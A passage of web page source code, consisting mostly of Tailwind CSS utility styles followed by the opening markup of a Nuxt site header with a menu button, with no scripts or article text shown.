monospace}.text-3xl{font-size:1.875rem;line-height:2.25rem}.text-\[10px\]{font-size:10px}.text-base{font-size:1rem;line-height:1.5rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.text-\[15px\]{font-size:15px}.text-lg{font-size:1.125rem;line-height:1.75rem}.text-xl{font-size:1.25rem;line-height:1.75rem}.text-xs{font-size:0.75rem;line-height:1rem}.text-2xl{font-size:1.5rem;line-height:2rem}.font-bold{font-weight:700}.font-light{font-weight:300}.font-medium{font-weight:500}.font-semibold{font-weight:600}.italic{font-style:italic}.tracking-wide{letter-spacing:0.025em}.text-\[\#008a4e\]{--tw-text-opacity:1;color:rgb(0 138 78 / var(--tw-text-opacity, 1))}.text-\[\#333\]{--tw-text-opacity:1;color:rgb(51 51 51 / var(--tw-text-opacity, 1))}.text-\[\#f472b6\]{--tw-text-opacity:1;color:rgb(244 114 182 / var(--tw-text-opacity, 1))}.text-gray-400{--tw-text-opacity:1;color:rgb(156 163 175 / var(--tw-text-opacity, 1))}.text-gray-600{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.text-\[\#d5f1ff\]{--tw-text-opacity:1;color:rgb(213 241 255 / var(--tw-text-opacity, 1))}.text-\[\#007547\]{--tw-text-opacity:1;color:rgb(0 117 71 / var(--tw-text-opacity, 1))}.text-\[\#522BE3\]{--tw-text-opacity:1;color:rgb(82 43 227 / var(--tw-text-opacity, 1))}.text-\[\#DC2626\]{--tw-text-opacity:1;color:rgb(220 38 38 / var(--tw-text-opacity, 1))}.text-black{--tw-text-opacity:1;color:rgb(0 0 0 / var(--tw-text-opacity, 1))}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128 / var(--tw-text-opacity, 1))}.text-gray-700{--tw-text-opacity:1;color:rgb(55 65 81 / var(--tw-text-opacity, 1))}.text-gray-800{--tw-text-opacity:1;color:rgb(31 41 55 / var(--tw-text-opacity, 1))}.text-gray-900{--tw-text-opacity:1;color:rgb(17 24 39 / var(--tw-text-opacity, 1))}.text-green-600{--tw-text-opacity:1;color:rgb(22 163 74 / var(--tw-text-opacity, 1))}.text-green-800{--tw-text-opacity:1;color:rgb(22 101 52 / var(--tw-text-opacity, 1))}.text-pink-500{--tw-text-opacity:1;color:rgb(236 72 153 / var(--tw-text-opacity, 1))}.text-red-600{--tw-text-opacity:1;color:rgb(220 38 38 / var(--tw-text-opacity, 1))}.opacity-0{opacity:0}.opacity-25{opacity:0.25}.opacity-75{opacity:0.75}.shadow-\[0_8px_30px_rgb\(0\2c 0\2c 0\2c 0\.12\)\]{--tw-shadow:0 8px 30px rgb(0,0,0,0.12);--tw-shadow-colored:0 8px 30px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-sm{--tw-shadow:0 1px 2px 0 rgb(0 0 0 / 0.05);--tw-shadow-colored:0 1px 2px 0 var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-2xl{--tw-shadow:0 25px 50px -12px rgb(0 0 0 / 0.25);--tw-shadow-colored:0 25px 50px -12px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-lg{--tw-shadow:0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 10px 15px -3px var(--tw-shadow-color), 0 4px 6px -4px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-md{--tw-shadow:0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-xl{--tw-shadow:0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 20px 25px -5px var(--tw-shadow-color), 0 8px 10px -6px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.outline-none{outline:2px solid transparent;outline-offset:2px}.transition-colors{transition-property:color, background-color, border-color, fill, stroke, -webkit-text-decoration-color;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke, -webkit-text-decoration-color;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.transition-all{transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.transition-opacity{transition-property:opacity;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.hover\:cursor-wait:hover{cursor:wait}.hover\:rounded-full:hover{border-radius:9999px}.hover\:bg-\[\#4a3ecf\]:hover{--tw-bg-opacity:1;background-color:rgb(74 62 207 / var(--tw-bg-opacity, 1))}.hover\:bg-indigo-600:hover{--tw-bg-opacity:1;background-color:rgb(79 70 229 / var(--tw-bg-opacity, 1))}.hover\:text-gray-600:hover{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.hover\:text-gray-500:hover{--tw-text-opacity:1;color:rgb(107 114 128 / var(--tw-text-opacity, 1))}.focus\:border-indigo-500:focus{--tw-border-opacity:1;border-color:rgb(99 102 241 / var(--tw-border-opacity, 1))}.focus\:outline-none:focus{outline:2px solid transparent;outline-offset:2px}.focus\:ring-2:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)}.focus\:ring-indigo-500:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(99 102 241 / var(--tw-ring-opacity, 1))}.focus\:ring-offset-2:focus{--tw-ring-offset-width:2px}.active\:scale-\[0\.98\]:active{--tw-scale-x:0.98;--tw-scale-y:0.98;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.active\:rounded-full:active{border-radius:9999px}@media (min-width: 640px){.sm\:translate-y-0{--tw-translate-y:0px;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.sm\:items-center{align-items:center}.sm\:rounded-2xl{border-radius:1rem}.sm\:p-4{padding:1rem}.sm\:opacity-100{opacity:1}}@media (min-width: 768px){.md\:block{display:block}.md\:text-base{font-size:1rem;line-height:1.5rem}}@media (min-width: 1024px){.lg\:block{display:block}.lg\:hidden{display:none}}</style><style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.pointer-events-none{pointer-events:none}.pointer-events-auto{pointer-events:auto}.visible{visibility:visible}.fixed{position:fixed}.absolute{position:absolute}.relative{position:relative}.inset-0{inset:0px}.inset-x-0{left:0px;right:0px}.top-\[7\%\]{top:7%}.left-3{left:0.75rem}.top-3{top:0.75rem}.left-0{left:0px}.top-0{top:0px}.z-10{z-index:10}.z-\[9999\]{z-index:9999}.z-50{z-index:50}.z-30{z-index:30}.mx-\[4px\]{margin-left:4px;margin-right:4px}.my-1{margin-top:0.25rem;margin-bottom:0.25rem}.mx-auto{margin-left:auto;margin-right:auto}.me-\[12px\]{margin-inline-end:12px}.mb-2{margin-bottom:0.5rem}.mb-1{margin-bottom:0.25rem}.mb-4{margin-bottom:1rem}.mb-6{margin-bottom:1.5rem}.mr-3{margin-right:0.75rem}.mt-1{margin-top:0.25rem}.mt-2{margin-top:0.5rem}.mt-4{margin-top:1rem}.mt-\[8px\]{margin-top:8px}.block{display:block}.inline-block{display:inline-block}.flex{display:flex}.hidden{display:none}.size-\[24px\]{width:24px;height:24px}.h-0\.5{height:0.125rem}.h-5{height:1.25rem}.h-7{height:1.75rem}.h-\[24px\]{height:24px}.h-6{height:1.5rem}.h-10{height:2.5rem}.h-12{height:3rem}.h-16{height:4rem}.h-3{height:0.75rem}.h-4{height:1rem}.h-full{height:100%}.min-h-screen{min-height:100vh}.w-5{width:1.25rem}.w-7{width:1.75rem}.w-\[42px\]{width:42px}.w-full{width:100%}.w-6{width:1.5rem}.w-10{width:2.5rem}.w-12{width:3rem}.w-16{width:4rem}.w-3{width:0.75rem}.w-4{width:1rem}.max-w-\[420px\]{max-width:420px}.max-w-md{max-width:28rem}.max-w-sm{max-width:24rem}.flex-1{flex:1 1 0%}.flex-shrink-0{flex-shrink:0}.shrink-0{flex-shrink:0}.translate-y-full{--tw-translate-y:100%;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.scale-95{--tw-scale-x:.95;--tw-scale-y:.95;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.transform{transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}@keyframes spin{to{transform:rotate(360deg)}}.animate-spin{animation:spin 1s linear infinite}.cursor-pointer{cursor:pointer}.flex-col{flex-direction:column}.items-start{align-items:flex-start}.items-end{align-items:flex-end}.items-center{align-items:center}.items-baseline{align-items:baseline}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.gap-2{gap:0.5rem}.gap-3{gap:0.75rem}.gap-1{gap:0.25rem}.gap-4{gap:1rem}.space-y-2 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0.5rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0.5rem * var(--tw-space-y-reverse))}.space-y-3 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0.75rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0.75rem * var(--tw-space-y-reverse))}.space-y-4 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1rem * var(--tw-space-y-reverse))}.overflow-hidden{overflow:hidden}.truncate{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.rounded{border-radius:0.25rem}.rounded-2xl{border-radius:1rem}.rounded-xl{border-radius:0.75rem}.rounded-md{border-radius:0.375rem}.rounded-\[8px\]{border-radius:8px}.rounded-full{border-radius:9999px}.rounded-lg{border-radius:0.5rem}.rounded-t-2xl{border-top-left-radius:1rem;border-top-right-radius:1rem}.rounded-br-lg{border-bottom-right-radius:0.5rem}.border{border-width:1px}.border-t{border-top-width:1px}.border-b{border-bottom-width:1px}.border-gray-100{--tw-border-opacity:1;border-color:rgb(243 244 246 / var(--tw-border-opacity, 1))}.border-gray-300{--tw-border-opacity:1;border-color:rgb(209 213 219 / var(--tw-border-opacity, 1))}.border-gray-50{--tw-border-opacity:1;border-color:rgb(249 250 251 / var(--tw-border-opacity, 1))}.border-\[\#5278ad\]{--tw-border-opacity:1;border-color:rgb(82 120 173 / var(--tw-border-opacity, 1))}.border-gray-600\/50{border-color:rgb(75 85 99 / 0.5)}.border-gray-200{--tw-border-opacity:1;border-color:rgb(229 231 235 / var(--tw-border-opacity, 1))}.border-indigo-50{--tw-border-opacity:1;border-color:rgb(238 242 255 / var(--tw-border-opacity, 1))}.border-red-200{--tw-border-opacity:1;border-color:rgb(254 202 202 / var(--tw-border-opacity, 1))}.bg-\[\#99f1c5\]{--tw-bg-opacity:1;background-color:rgb(153 241 197 / var(--tw-bg-opacity, 1))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}.bg-\[\#3b5d8a\]{--tw-bg-opacity:1;background-color:rgb(59 93 138 / var(--tw-bg-opacity, 1))}.bg-black\/80{background-color:rgb(0 0 0 / 0.8)}.bg-\[\#5b4ef6\]{--tw-bg-opacity:1;background-color:rgb(91 78 246 / var(--tw-bg-opacity, 1))}.bg-\[\#D1FADF\]{--tw-bg-opacity:1;background-color:rgb(209 250 223 / var(--tw-bg-opacity, 1))}.bg-\[\#EFEBFD\]{--tw-bg-opacity:1;background-color:rgb(239 235 253 / var(--tw-bg-opacity, 1))}.bg-\[\#F5F6FF\]{--tw-bg-opacity:1;background-color:rgb(245 246 255 / var(--tw-bg-opacity, 1))}.bg-\[\#FEF2F2\]{--tw-bg-opacity:1;background-color:rgb(254 242 242 / var(--tw-bg-opacity, 1))}.bg-black\/60{background-color:rgb(0 0 0 / 0.6)}.bg-gray-50{--tw-bg-opacity:1;background-color:rgb(249 250 251 / var(--tw-bg-opacity, 1))}.bg-green-100{--tw-bg-opacity:1;background-color:rgb(220 252 231 / var(--tw-bg-opacity, 1))}.bg-red-50{--tw-bg-opacity:1;background-color:rgb(254 242 242 / var(--tw-bg-opacity, 1))}.bg-transparent{background-color:transparent}.bg-gradient-to-r{background-image:linear-gradient(to right, var(--tw-gradient-stops))}.from-\[\#f7e44e\]{--tw-gradient-from:#f7e44e var(--tw-gradient-from-position);--tw-gradient-to:rgb(247 228 78 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.from-\[\#ff7f98\]{--tw-gradient-from:#ff7f98 var(--tw-gradient-from-position);--tw-gradient-to:rgb(255 127 152 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.to-\[\#ffaf45\]{--tw-gradient-to:#ffaf45 var(--tw-gradient-to-position)}.to-\[\#6242fb\]{--tw-gradient-to:#6242fb var(--tw-gradient-to-position)}.fill-\[\#007547\]{fill:#007547}.fill-\[\#DC2626\]{fill:#DC2626}.object-contain{object-fit:contain}.object-cover{object-fit:cover}.p-\[10px\]{padding:10px}.p-4{padding:1rem}.p-6{padding:1.5rem}.p-0{padding:0px}.p-1{padding:0.25rem}.p-1\.5{padding:0.375rem}.p-5{padding:1.25rem}.px-2{padding-left:0.5rem;padding-right:0.5rem}.px-4{padding-left:1rem;padding-right:1rem}.px-\[8px\]{padding-left:8px;padding-right:8px}.py-0\.5{padding-top:0.125rem;padding-bottom:0.125rem}.py-1{padding-top:0.25rem;padding-bottom:0.25rem}.py-3{padding-top:0.75rem;padding-bottom:0.75rem}.px-3{padding-left:0.75rem;padding-right:0.75rem}.px-5{padding-left:1.25rem;padding-right:1.25rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.px-8{padding-left:2rem;padding-right:2rem}.px-\[12px\]{padding-left:12px;padding-right:12px}.py-2{padding-top:0.5rem;padding-bottom:0.5rem}.py-3\.5{padding-top:0.875rem;padding-bottom:0.875rem}.py-4{padding-top:1rem;padding-bottom:1rem}.py-\[6px\]{padding-top:6px;padding-bottom:6px}.pb-4{padding-bottom:1rem}.pb-2{padding-bottom:0.5rem}.pb-6{padding-bottom:1.5rem}.pt-2{padding-top:0.5rem}.pt-4{padding-top:1rem}.pt-5{padding-top:1.25rem}.text-left{text-align:left}.text-center{text-align:center}.text-right{text-align:right}.font-sans{font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"}.font-mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}.text-3xl{font-size:1.875rem;line-height:2.25rem}.text-\[10px\]{font-size:10px}.text-base{font-size:1rem;line-height:1.5rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.text-\[15px\]{font-size:15px}.text-lg{font-size:1.125rem;line-height:1.75rem}.text-xl{font-size:1.25rem;line-height:1.75rem}.text-xs{font-size:0.75rem;line-height:1rem}.text-2xl{font-size:1.5rem;line-height:2rem}.font-bold{font-weight:700}.font-light{font-weight:300}.font-medium{font-weight:500}.font-semibold{font-weight:600}.italic{font-style:italic}.tracking-wide{letter-spacing:0.025em}.text-\[\#008a4e\]{--tw-text-opacity:1;color:rgb(0 138 78 / var(--tw-text-opacity, 1))}.text-\[\#333\]{--tw-text-opacity:1;color:rgb(51 51 51 / var(--tw-text-opacity, 1))}.text-\[\#f472b6\]{--tw-text-opacity:1;color:rgb(244 114 182 / var(--tw-text-opacity, 1))}.text-gray-400{--tw-text-opacity:1;color:rgb(156 163 175 / var(--tw-text-opacity, 1))}.text-gray-600{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.text-\[\#d5f1ff\]{--tw-text-opacity:1;color:rgb(213 241 255 / var(--tw-text-opacity, 1))}.text-\[\#007547\]{--tw-text-opacity:1;color:rgb(0 117 71 / var(--tw-text-opacity, 1))}.text-\[\#522BE3\]{--tw-text-opacity:1;color:rgb(82 43 227 / var(--tw-text-opacity, 1))}.text-\[\#DC2626\]{--tw-text-opacity:1;color:rgb(220 38 38 / var(--tw-text-opacity, 1))}.text-black{--tw-text-opacity:1;color:rgb(0 0 0 / var(--tw-text-opacity, 1))}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128 / var(--tw-text-opacity, 1))}.text-gray-700{--tw-text-opacity:1;color:rgb(55 65 81 / var(--tw-text-opacity, 1))}.text-gray-800{--tw-text-opacity:1;color:rgb(31 41 55 / var(--tw-text-opacity, 1))}.text-gray-900{--tw-text-opacity:1;color:rgb(17 24 39 / var(--tw-text-opacity, 1))}.text-green-600{--tw-text-opacity:1;color:rgb(22 163 74 / var(--tw-text-opacity, 1))}.text-green-800{--tw-text-opacity:1;color:rgb(22 101 52 / var(--tw-text-opacity, 1))}.text-pink-500{--tw-text-opacity:1;color:rgb(236 72 153 / var(--tw-text-opacity, 1))}.text-red-600{--tw-text-opacity:1;color:rgb(220 38 38 / var(--tw-text-opacity, 1))}.opacity-0{opacity:0}.opacity-25{opacity:0.25}.opacity-75{opacity:0.75}.shadow-\[0_8px_30px_rgb\(0\2c 0\2c 0\2c 0\.12\)\]{--tw-shadow:0 8px 30px rgb(0,0,0,0.12);--tw-shadow-colored:0 8px 30px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-sm{--tw-shadow:0 1px 2px 0 rgb(0 0 0 / 0.05);--tw-shadow-colored:0 1px 2px 0 var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-2xl{--tw-shadow:0 25px 50px -12px rgb(0 0 0 / 0.25);--tw-shadow-colored:0 25px 50px -12px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-lg{--tw-shadow:0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 10px 15px -3px var(--tw-shadow-color), 0 4px 6px -4px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-md{--tw-shadow:0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-xl{--tw-shadow:0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 20px 25px -5px var(--tw-shadow-color), 0 8px 10px -6px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.outline-none{outline:2px solid transparent;outline-offset:2px}.transition-colors{transition-property:color, background-color, border-color, fill, stroke, -webkit-text-decoration-color;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke, -webkit-text-decoration-color;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.transition-all{transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.transition-opacity{transition-property:opacity;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.hover\:cursor-wait:hover{cursor:wait}.hover\:rounded-full:hover{border-radius:9999px}.hover\:bg-\[\#4a3ecf\]:hover{--tw-bg-opacity:1;background-color:rgb(74 62 207 / var(--tw-bg-opacity, 1))}.hover\:bg-indigo-600:hover{--tw-bg-opacity:1;background-color:rgb(79 70 229 / var(--tw-bg-opacity, 1))}.hover\:text-gray-600:hover{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.hover\:text-gray-500:hover{--tw-text-opacity:1;color:rgb(107 114 128 / var(--tw-text-opacity, 1))}.focus\:border-indigo-500:focus{--tw-border-opacity:1;border-color:rgb(99 102 241 / var(--tw-border-opacity, 1))}.focus\:outline-none:focus{outline:2px solid transparent;outline-offset:2px}.focus\:ring-2:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)}.focus\:ring-indigo-500:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(99 102 241 / var(--tw-ring-opacity, 1))}.focus\:ring-offset-2:focus{--tw-ring-offset-width:2px}.active\:scale-\[0\.98\]:active{--tw-scale-x:0.98;--tw-scale-y:0.98;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.active\:rounded-full:active{border-radius:9999px}@media (min-width: 640px){.sm\:translate-y-0{--tw-translate-y:0px;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.sm\:items-center{align-items:center}.sm\:rounded-2xl{border-radius:1rem}.sm\:p-4{padding:1rem}.sm\:opacity-100{opacity:1}}@media (min-width: 768px){.md\:block{display:block}.md\:text-base{font-size:1rem;line-height:1.5rem}}@media (min-width: 1024px){.lg\:block{display:block}.lg\:hidden{display:none}}</style></head>
   <body>
<style>
.button-solid[data-v-cac760de] {
  border-radius: 100px;
  border-style: solid;
  border-width: 1px;
  font-size: 14px;
  font-weight: 600;
  height: 44px;
  line-height: 150%;
  overflow-wrap: break-word;
  position: relative;
  --tw-border-opacity: 1;
  border-color: rgb(159, 155, 181);
  --tw-bg-opacity: 1;
  background-color: rgb(101, 97, 117);
  --tw-text-opacity: 1;
  color: rgb(246 245 252/var(--tw-text-opacity,1));
}
</style>
      <div id="__nuxt">
         <div class="layout min-h-screen" data-v-0886a856="">
            <!---->
            <header class="header" data-testid="nav-header" data-v-0886a856="" data-v-a6985b27="">
               <div class="header__container" data-v-a6985b27="">
                  <div class="hover:rounded-full hover:bg-surface-dark-lighter active:rounded-full active:bg-surface-dark-lighter" role="button" data-testid="nav-hamburger-menu" data-v-a6985b27="">
